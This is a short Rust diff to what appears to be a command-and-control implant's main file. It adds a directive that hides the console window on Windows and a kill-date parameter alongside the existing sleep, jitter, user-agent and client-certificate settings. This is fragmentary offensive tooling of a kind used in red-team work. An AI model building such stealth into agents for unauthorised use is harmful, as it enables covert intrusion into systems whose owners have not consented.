@@ -1,3 +1,5 @@
+#![windows_subsystem = "windows"]
+
 use config::config::Config;
 use crypto::aesgcm::{
     AES_GCM_KEY_LENGTH,
@@ -26,6 +28,7 @@ async fn main() {
         sleep,
         jitter,
         user_agent,
+        killdate,
         https_root_cert,
         https_client_cert,
         https_client_key,
@@ -46,6 +49,7 @@ async fn main() {
         jitter,
         sleep,
         user_agent.to_string(),
+        killdate.to_string(),
         https_root_cert.to_string(),
         https_client_cert.to_string(),
         https_client_key.to_string(),
